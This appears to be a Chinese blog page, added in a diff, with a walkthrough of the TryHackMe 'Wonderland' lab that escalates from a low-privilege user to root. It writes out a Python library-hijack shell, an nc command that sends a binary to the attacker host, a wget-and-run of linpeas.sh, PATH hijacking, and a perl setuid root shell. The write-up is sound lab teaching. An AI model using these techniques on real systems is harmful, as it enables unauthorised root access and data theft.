@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>Try Hack-Wonderland - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="0x00可以学到很多提权的方式 参考链接:  通过 Python 库劫持进行权限提升 PATH环境变量拦截路径虽然说的是windows，但是linux也是同理的 capabilities 使用perl进行提权 优秀的wp  ssh连接先nmap扫一下端口，发现开启了22端口 image-20230110201300334  网站的标题是Follow the White Rabbit. 再结合使用d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Try Hack-Wonderland">
+<meta property="og:url" content="http://example.com/2023/07/03/%E9%9D%B6%E6%9C%BA/THM_wonderland/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="0x00可以学到很多提权的方式 参考链接:  通过 Python 库劫持进行权限提升 PATH环境变量拦截路径虽然说的是windows，但是linux也是同理的 capabilities 使用perl进行提权 优秀的wp  ssh连接先nmap扫一下端口，发现开启了22端口 image-20230110201300334  网站的标题是Follow the White Rabbit. 再结合使用d">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102013377.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301101954574.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301101956175.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102122828.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102142211.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102210850.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102249943.png">
+<meta property="article:published_time" content="2023-07-03T08:59:12.954Z">
+<meta property="article:modified_time" content="2023-07-03T08:59:13.007Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="Linux提权">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102013377.png">
+  
+  
+  
+  <meta name="keywords" content="Linux提权">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">Try Hack-Wonderland</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E8%BF%9E%E6%8E%A5"><span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3rabbit"><span class="toc-text">提权至rabbit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3hatter"><span class="toc-text">提权至hatter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="toc-text">提权至root</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Tryhackme/">Tryhackme</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:59:12.954Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>Try Hack-Wonderland</span></h1>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>可以学到很多提权的方式</p>
+<p>参考链接:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">通过 Python 库劫持进行权限提升</a></li>
+<li><a target="_blank" rel="noopener" href="http://attack.mitre.org/techniques/T1574/007/">PATH环境变量拦截路径</a>虽然说的是windows，但是linux也是同理的</li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities">capabilities</a></li>
+<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/perl/#capabilities">使用perl进行提权</a></li>
+<li><a target="_blank" rel="noopener" href="https://anilcelik.medium.com/en-tryhackme-wonderland-write-up-5443da058acc">优秀的wp</a></li>
+</ul>
+<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>先nmap扫一下端口，发现开启了22端口</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102013377.png" alt="image-20230110201300334" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110201300334</span></div></div>
+
+<p>网站的标题是Follow the White Rabbit.</p>
+<p>再结合使用dirbuster扫到了&#x2F;r&#x2F;a,猜测是访问&#x2F;r&#x2F;a&#x2F;b&#x2F;b&#x2F;i&#x2F;t</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301101954574.png" alt="image-20230110195402386" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110195402386</span></div></div>
+
+<p>然后到了这个页面</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301101956175.png" alt="image-20230110195627049" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110195627049</span></div></div>
+
+<p>查看源码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice:HowDothTheLittleCrocodileImproveHisShiningTail</span><br></pre></td></tr></table></figure>
+
+<p>看起来是ssh登录的账户和密码</p>
+<p>使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh alice@10.10.197.160</span><br></pre></td></tr></table></figure>
+
+<p>来使用ssh连接</p>
+<p>然后发现这个用户的权限非常低，所以要提权</p>
+<h2 id="提权至rabbit"><a href="#提权至rabbit" class="headerlink" title="提权至rabbit"></a>提权至rabbit</h2><p>使用<code>sudo -l</code>查看当前用户可执行与无法执行的指令,发现可以使用rabbit的权限去运行python3和walrus_and_the_carpenter.py文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries <span class="keyword">for</span> alice on wonderland:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User alice may run the following commands on wonderland:</span><br><span class="line">    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span><br></pre></td></tr></table></figure>
+
+<p>然后再看看walrus_and_the_carpenter.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">poem = <span class="string">&quot;&quot;&quot;The sun was shining on the sea,</span></span><br><span class="line"><span class="string">Shining with all his might:</span></span><br><span class="line"><span class="string">................</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    line = random.choice(poem.split(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The line was:\t&quot;</span>, line)</span><br></pre></td></tr></table></figure>
+
+<p>他导入了一个random库，然后设置了一个变量poem，让他随机打印十行诗句</p>
+<p>这里的关键就是<strong>通过劫持Python库进行权限提升</strong></p>
+<p>python在导入库的时候，有一个库的搜索路径列表，使用下面的命令可以输出搜索顺序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys;print (sys.path)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/usr/lib/python36.zip&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.6&#x27;</span>, <span class="string">&#x27;/usr/lib/python3.6/lib-dynload&#x27;</span>, <span class="string">&#x27;/usr/local/lib/python3.6/dist-packages&#x27;</span>, <span class="string">&#x27;/usr/lib/python3/dist-packages&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>最前面的表示当前目录，即和执行的py脚本在同一个目录</p>
+<p>我们只要把自己写的random.py文件放在原本的random.py前面，从而劫持库来进行提权</p>
+<p>在&#x2F;usr&#x2F;lib&#x2F;python3.6目录下可以找到random.py，所以我们在walrus_and_the_carpenter.py的同一目录下创建一个random.py，这样在导入random库的时候就会先导入我们写的random.py，从而来提升到rabbit权限</p>
+<p><code>/home/alice/</code>我们是有权限写入的</p>
+<p><code>random.py</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后用rabbit用户运行这个脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</span><br></pre></td></tr></table></figure>
+
+<p>就可以发现，已经切换到rabbit用户了</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102122828.png" alt="image-20230110212238778" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110212238778</span></div></div>
+
+
+
+<p>user.txt是看提示，说一切都是颠倒的，所以user.txt在&#x2F;root里被找到</p>
+<p>&#x2F;root&#x2F;里不能使用ls，所以只能直接猜</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/user.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权至hatter"><a href="#提权至hatter" class="headerlink" title="提权至hatter"></a>提权至hatter</h2><p>然后还得提权</p>
+<p>在&#x2F;home&#x2F;rabbit目录发现了存在suid位的可执行文件teaParty</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102142211.png" alt="image-20230110213944067" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110213944067</span></div></div>
+
+
+
+
+
+<p>有suid位，说明其他用户在执行这个程序的时候，将获取文件所有者的权限以及所有者的UID和GID，可以进行提权</p>
+<p>可以查看一下这个可执行文件，使用nc来将文件下载下来</p>
+<p>目标机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.18.104.32 9000 &lt; teaParty </span><br></pre></td></tr></table></figure>
+
+<p>攻击机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9000 &gt; teaParty</span><br></pre></td></tr></table></figure>
+
+<p>使用ida查看，得到伪代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(<span class="number">0x3EB</span>u);</span><br><span class="line">  setgid(<span class="number">0x3EB</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the tea party!\nThe Mad Hatter will be here soon.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/echo -n &#x27;Probably by &#x27; &amp;&amp; date --date=&#x27;next hour&#x27; -R&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ask very nicely, and I will give you some tea while you wait for him&quot;</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Segmentation fault (core dumped)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现他会执行<code>echo</code>和<code>date</code>两个系统命令，echo是直接执行的文件，而data是通过系统变量来定位的文件</p>
+<p>使用命令<code>echo $PATH</code>查看目标主机的系统变量，为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>which date</code>可以知道这个命令的绝对路径，为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/date</span><br></pre></td></tr></table></figure>
+
+<p>我们可以找一个有权限写入的目录，构造一个可执行脚本，并命名为date。然后修改PATH的值将这个伪造的可执行文件date的目录放在最前面。</p>
+<p>这样在执行teaParty的时候，他就会以root的权限执行这个文件，然后在执行date的时候就会执行到我们构造的那个恶意文件</p>
+<p>查找发现&#x2F;tmp可以写入</p>
+<p><code>date</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">date</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p>查看PATH，<code>echo $PATH</code>，已经生效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<p>然后执行teaParty,成功提权为hatter用户</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102210850.png" alt="image-20230110221048792" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110221048792</span></div></div>
+
+<p>在&#x2F;home&#x2F;hatter可以发现password.txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WhyIsARavenLikeAWritingDesk?</span><br></pre></td></tr></table></figure>
+
+<p>猜测可能是root的密码,发现不是。</p>
+<p>尝试tryhackme用户，也不是。</p>
+<p>最后发现就是hatter用户的密码。</p>
+<p>执行<code>sudo -l</code>后，发现没有什么可以使用sudo执行的命令</p>
+<h2 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h2><p>可以使用<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>来查找可能存在的提权方式</p>
+<p>在攻击机上开启pytho服务，目标机使用wget下载文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.18.104.3x:8000/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">./linpeas.sh -a</span><br></pre></td></tr></table></figure>
+
+<p>在capability中可以发现以下内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Files with capabilities (limited to 50):</span><br><span class="line">/usr/bin/perl5.26.1 = cap_setuid+ep</span><br><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><br><span class="line">/usr/bin/perl = cap_setuid+ep</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">Capability</a>是linux将root权限进行分割然后分配给其他进程，使其他进程可以在普通用户权限下让程序拥有额外的权限</p>
+<p>为了让Capability的概念更透彻，我们可以举下面的例子：假设有一个web服务器运行在80端口，我们需要额外的root权限来扫描1024端口之前的端口。在这一点上，而不是给full root 权限给低权限用户，我们可以设置capability给二进制文件来执行所需的操作。</p>
+<p>这里perl拥有一些capability，在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/perl/#capabilities">gtfobins</a>上找使用perl进行提权的相关命令</p>
+<p>执行以下命令，得到root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301102249943.png" alt="image-20230110224918893" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230110224918893</span></div></div>
+
+
+
+<p>然后就可以去&#x2F;home&#x2F;alice&#x2F;读取root.txt了 XD</p>
+
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/07/03/%E9%9D%B6%E6%9C%BA/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%EF%BC%88%E4%B8%80)%20/">ATT&CK实战系列-红队评估(一)</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/07/03/%E6%AF%94%E8%B5%9Bwp/2023%E7%A4%BE%E5%9B%A2%E5%9B%9B%E6%9C%88%E8%B5%9B/">2023社团四月赛-玄奇阁wp</a></div></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@anonymity</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
